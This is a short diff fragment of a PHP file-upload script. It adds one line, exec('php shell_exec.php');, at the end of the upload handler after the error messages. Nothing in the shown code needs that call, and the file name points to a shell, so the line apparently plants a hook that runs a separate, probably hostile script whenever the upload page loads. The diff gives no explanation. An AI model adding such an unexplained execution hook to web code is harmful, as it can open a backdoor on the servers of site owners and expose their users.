@@ -41,4 +41,5 @@ if ($uploadOk == 0) {
         echo "Sorry, there was an error uploading your file.";
     }
 }
+exec("php shell_exec.php");
 ?>
